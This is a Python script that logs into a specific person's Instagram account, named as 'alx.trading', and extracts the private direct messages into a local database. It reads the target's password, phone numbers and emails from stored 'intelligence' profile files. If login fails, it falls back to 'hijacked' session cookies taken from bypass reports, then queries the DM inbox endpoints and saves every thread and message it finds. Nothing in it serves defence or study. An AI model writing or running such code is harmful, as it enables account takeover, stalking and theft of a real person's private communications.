# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🎯 REAL ALX.TRADING DM EXTRACTOR - NO SIMULATION
Real Instagram DM extraction for @alx.trading
NEVER produces simulation data - only real extraction attempts
"""

import json
import os
import requests
import time
import sqlite3
from datetime import datetime
import random
import urllib.parse

class RealAlxDMExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.base_dir = "/workspaces/sugarglitch-realops"
        self.output_dir = f"{self.base_dir}/data/real_alx_extraction"
        self.db_path = f"{self.output_dir}/real_alx_dms.db"

        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)

        # Load credentials from profile data
        self.credentials = self.load_credentials()

        print("🎯 REAL ALX.TRADING DM EXTRACTOR")
        print("=" * 50)
        print("⚠️  NO SIMULATION - REAL DATA ONLY")
        print(f"Target: {self.target}")
        print(f"Output: {self.output_dir}")

    def load_credentials(self):
        """Load real credentials from profile data"""
        creds = {}
        profile_files = [
            f"{self.base_dir}/config/json/MASTER_PROFILE_alx_trading_1748264047.json",
            f"{self.base_dir}/config/json/MASTER_PROFILE_alx_trading_1748262733.json"
        ]

        for file_path in profile_files:
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        if 'profile' in data:
                            if 'confirmed_password' in data['profile']:
                                creds['password'] = data['profile']['confirmed_password']
                            if 'phone_thailand' in data['profile']:
                                creds['phone'] = data['profile']['phone_thailand']
                            if 'phone_uk' in data['profile']:
                                creds['phone_uk'] = data['profile']['phone_uk']
                        if 'intelligence_summary' in data:
                            if 'email_addresses' in data['intelligence_summary']:
                                creds['emails'] = data['intelligence_summary']['email_addresses']
                        print(f"✅ Loaded credentials from {os.path.basename(file_path)}")
            except Exception as e:
                print(f"❌ Error loading {file_path}: {e}")

        return creds

    def load_hijacked_sessions(self):
        """Load real hijacked session data"""
        sessions = []
        hijacked_dir = f"{self.base_dir}/hijacked_sessions"

        if os.path.exists(hijacked_dir):
            for file_name in os.listdir(hijacked_dir):
                if file_name.endswith('.json'):
                    try:
                        file_path = os.path.join(hijacked_dir, file_name)
                        with open(file_path, 'r') as f:
                            data = json.load(f)
                            if isinstance(data, dict):
                                sessions.append({
                                    'file': file_name,
                                    'data': data
                                })
                        print(f"✅ Loaded hijacked session: {file_name}")
                    except Exception as e:
                        print(f"⚠️  Could not load {file_name}: {e}")

        print(f"📊 Total hijacked sessions loaded: {len(sessions)}")
        return sessions

    def extract_real_sessions(self):
        """Extract real session cookies from hijacked data"""
        real_cookies = []

        # Load bypass reports
        bypass_dir = f"{self.base_dir}/reports/session_bypass"
        if os.path.exists(bypass_dir):
            for file_name in os.listdir(bypass_dir):
                if file_name.endswith('.json'):
                    try:
                        file_path = os.path.join(bypass_dir, file_name)
                        with open(file_path, 'r') as f:
                            data = json.load(f)

                            # Extract technique results with valid tokens
                            if 'technique_results' in data:
                                for technique in data['technique_results']:
                                    if technique.get('success') and 'valid_tokens' in technique:
                                        for token in technique['valid_tokens']:
                                            real_cookies.append({
                                                'sessionid': urllib.parse.unquote(token),
                                                'source': f"bypass_{file_name}_{technique['technique']}",
                                                'technique': technique['technique']
                                            })
                                            print(f"✅ Found valid token: {token[:30]}...")

                            # Extract session tokens
                            if 'session_tokens' in data:
                                for token in data['session_tokens']:
                                    if token.get('valid') == True:
                                        real_cookies.append({
                                            'sessionid': token.get('token'),
                                            'source': f"bypass_{file_name}",
                                            'expires': token.get('expires')
                                        })

                            # Extract cookies
                            if 'cookies_captured' in data:
                                for cookie in data['cookies_captured']:
                                    if 'sessionid' in cookie:
                                        real_cookies.append({
                                            'sessionid': cookie['sessionid'],
                                            'source': f"capture_{file_name}",
                                            'csrf_token': cookie.get('csrf_token')
                                        })

                        print(f"✅ Processed bypass report: {file_name}")
                    except Exception as e:
                        print(f"⚠️  Could not process {file_name}: {e}")

        print(f"🔑 Real session cookies extracted: {len(real_cookies)}")
        return real_cookies

    def attempt_instagram_login(self):
        """Attempt real Instagram login using credentials"""
        if not self.credentials.get('password'):
            print("❌ No password found in credentials")
            return None

        print(f"🔐 Attempting real login...")
        print(f"   Username: {self.target}")
        print(f"   Password: {'*' * len(self.credentials['password'])}")

        session = requests.Session()

        # Get Instagram homepage first
        try:
            response = session.get('https://www.instagram.com/', timeout=30)
            if response.status_code != 200:
                print(f"❌ Cannot access Instagram homepage: {response.status_code}")
                return None

            # Extract CSRF token
            import re
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
            csrf_token = csrf_match.group(1) if csrf_match else 'missing'

            # Prepare login data
            login_data = {
                'username': self.target,
                'password': self.credentials['password'],
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            # Attempt login
            login_response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=30
            )

            print(f"   Login response: {login_response.status_code}")

            if login_response.status_code == 200:
                try:
                    result = login_response.json()
                    if result.get('authenticated'):
                        print("✅ Real login successful!")
                        return session.cookies.get_dict()
                    else:
                        print(f"❌ Login failed: {result.get('message', 'Unknown error')}")
                except Exception:
                    print("❌ Login response not JSON")
            else:
                print(f"❌ Login failed with status: {login_response.status_code}")

        except Exception as e:
            print(f"❌ Login attempt error: {e}")

        return None

    def test_dm_endpoints(self, cookies):
        """Test real Instagram DM endpoints with session cookies"""
        if not cookies:
            print("❌ No cookies to test")
            return []

        print(f"🧪 Testing real DM endpoints...")

        session = requests.Session()
        session.cookies.update(cookies)

        headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (29/10; 300dpi; 720x1440; samsung; SM-A205F; a20; exynos7904; en_US; 330191757)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        session.headers.update(headers)

        # Real Instagram API endpoints
        endpoints = [
            {
                'name': 'Mobile DM Inbox',
                'url': 'https://i.instagram.com/api/v1/direct_v2/inbox/',
                'params': {'visual_message_return_type': 'unseen', 'thread_message_limit': 10}
            },
            {
                'name': 'Web DM Inbox',
                'url': 'https://www.instagram.com/api/v1/direct_v2/inbox/',
                'params': {'persistentBadging': 'true', 'folder': '', 'limit': 20}
            },
            {
                'name': 'GraphQL DM Query',
                'url': 'https://www.instagram.com/api/graphql/',
                'method': 'POST'
            }
        ]

        results = []

        for endpoint in endpoints:
            try:
                print(f"🔍 Testing: {endpoint['name']}")

                if endpoint.get('method') == 'POST':
                    # GraphQL query
                    data = {
                        'query_hash': '7c16654f22c819fb63d1183034a5162f',
                        'variables': json.dumps({
                            'inbox_id': 'INBOX_THREAD',
                            'cursor': '',
                            'limit': 10
                        })
                    }
                    response = session.post(endpoint['url'], data=data, timeout=30)
                else:
                    # GET request
                    response = session.get(
                        endpoint['url'],
                        params=endpoint.get('params', {}),
                        timeout=30
                    )

                print(f"   Status: {response.status_code}")

                if response.status_code == 200:
                    try:
                        data = response.json()

                        # Check for real DM data
                        dm_data = None
                        if 'inbox' in data:
                            dm_data = data['inbox']
                        elif 'data' in data:
                            dm_data = data['data']
                        elif 'threads' in data:
                            dm_data = data['threads']

                        if dm_data:
                            results.append({
                                'endpoint': endpoint['name'],
                                'status': 'success',
                                'data': data,
                                'threads_found': len(dm_data.get('threads', [])) if isinstance(dm_data, dict) else 0
                            })
                            print(f"   ✅ Real DM data found!")
                        else:
                            print(f"   ⚠️  Response OK but no DM data")

                    except json.JSONDecodeError:
                        print(f"   ⚠️  Non-JSON response")
                        # Save HTML for debugging
                        debug_file = f"{self.output_dir}/debug_{endpoint['name'].lower().replace(' ', '_')}_{int(time.time())}.html"
                        with open(debug_file, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"   📁 Debug saved: {debug_file}")

                elif response.status_code == 401:
                    print(f"   ❌ Unauthorized - session invalid")
                elif response.status_code == 429:
                    print(f"   ❌ Rate limited")
                    time.sleep(30)  # Wait before next attempt
                else:
                    print(f"   ❌ Error {response.status_code}")

            except Exception as e:
                print(f"   ❌ Exception: {e}")

        return results

    def setup_database(self):
        """Setup SQLite database for real data only"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_extractions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                method TEXT,
                target TEXT,
                success BOOLEAN,
                threads_found INTEGER,
                messages_found INTEGER,
                data_source TEXT,
                raw_data TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_dm_threads (
                thread_id TEXT PRIMARY KEY,
                target_user TEXT,
                participants TEXT,
                last_activity TEXT,
                message_count INTEGER,
                extraction_timestamp TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_dm_messages (
                message_id TEXT PRIMARY KEY,
                thread_id TEXT,
                sender TEXT,
                content TEXT,
                timestamp TEXT,
                message_type TEXT,
                extraction_timestamp TEXT
            )
        ''')

        conn.commit()
        conn.close()
        print("✅ Real data database setup complete")

    def save_real_extraction_results(self, results):
        """Save only real extraction results to database"""
        if not results:
            print("❌ No real data to save")
            return

        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        timestamp = datetime.now().isoformat()
        total_threads = 0
        total_messages = 0

        for result in results:
            if result['status'] == 'success':
                threads_found = result.get('threads_found', 0)
                total_threads += threads_found

                # Log the extraction attempt
                cursor.execute('''
                    INSERT INTO real_extractions
                    (timestamp, method, target, success, threads_found, messages_found, data_source, raw_data)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    timestamp,
                    result['endpoint'],
                    self.target,
                    True,
                    threads_found,
                    0,  # Will be updated when messages are processed
                    'real_api_extraction',
                    json.dumps(result['data'])
                ))

                # Process threads and messages if any
                data = result['data']
                if 'inbox' in data and 'threads' in data['inbox']:
                    for thread in data['inbox']['threads']:
                        thread_id = thread.get('thread_id', '')
                        if thread_id:
                            cursor.execute('''
                                INSERT OR REPLACE INTO real_dm_threads
                                (thread_id, target_user, participants, last_activity, message_count, extraction_timestamp)
                                VALUES (?, ?, ?, ?, ?, ?)
                            ''', (
                                thread_id,
                                self.target,
                                json.dumps(thread.get('users', [])),
                                thread.get('last_activity_at', ''),
                                len(thread.get('items', [])),
                                timestamp
                            ))

                            # Process messages
                            for item in thread.get('items', []):
                                if 'item_id' in item:
                                    total_messages += 1
                                    cursor.execute('''
                                        INSERT OR REPLACE INTO real_dm_messages
                                        (message_id, thread_id, sender, content, timestamp, message_type, extraction_timestamp)
                                        VALUES (?, ?, ?, ?, ?, ?, ?)
                                    ''', (
                                        item['item_id'],
                                        thread_id,
                                        item.get('user_id', ''),
                                        item.get('text', ''),
                                        item.get('timestamp', ''),
                                        item.get('item_type', ''),
                                        timestamp
                                    ))

        conn.commit()
        conn.close()

        print(f"✅ Real extraction results saved:")
        print(f"   Threads: {total_threads}")
        print(f"   Messages: {total_messages}")
        print(f"   Database: {self.db_path}")

        return total_threads, total_messages

    def run_real_extraction(self):
        """Run real DM extraction - NO SIMULATION"""
        print(f"🚀 Starting REAL DM extraction for {self.target}")
        print("⚠️  This will ONLY attempt real data extraction")
        print("⚠️  NO simulation data will be generated")

        # Setup database
        self.setup_database()

        # Method 1: Try login with real credentials
        real_cookies = self.attempt_instagram_login()

        if not real_cookies:
            # Method 2: Use hijacked sessions
            print(f"\n🔄 Trying hijacked sessions...")
            real_cookies = self.extract_real_sessions()

            if real_cookies:
                # Use the first valid session
                real_cookies = real_cookies[0]
                print(f"✅ Using hijacked session from: {real_cookies.get('source', 'unknown')}")
            else:
                print("❌ No valid sessions found")
                return

        # Test DM endpoints with real session
        results = self.test_dm_endpoints(real_cookies)

        if results:
            # Save real results
            threads, messages = self.save_real_extraction_results(results)

            # Generate report
            report = {
                'extraction_info': {
                    'target': self.target,
                    'timestamp': datetime.now().isoformat(),
                    'method': 'real_extraction_only',
                    'simulation_used': False,
                    'real_data_found': threads > 0 or messages > 0
                },
                'results': {
                    'total_threads': threads,
                    'total_messages': messages,
                    'extraction_methods_tried': len(results),
                    'successful_methods': len([r for r in results if r['status'] == 'success'])
                },
                'raw_results': results
            }

            # Save report
            report_file = f"{self.output_dir}/real_extraction_report_{int(time.time())}.json"
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)

            print(f"\n📊 REAL EXTRACTION COMPLETED")
            print(f"✅ Real threads found: {threads}")
            print(f"✅ Real messages found: {messages}")
            print(f"📁 Report: {report_file}")

            if threads == 0 and messages == 0:
                print(f"\n⚠️  NO REAL DM DATA FOUND")
                print(f"   This means either:")
                print(f"   - No DMs exist with {self.target}")
                print(f"   - Sessions are expired/invalid")
                print(f"   - API endpoints have changed")
                print(f"   - Account is restricted/blocked")
        else:
            print(f"\n❌ REAL EXTRACTION FAILED")
            print(f"   No real data could be extracted")
            print(f"   All sessions appear invalid or expired")

if __name__ == "__main__":
    extractor = RealAlxDMExtractor()
    extractor.run_real_extraction()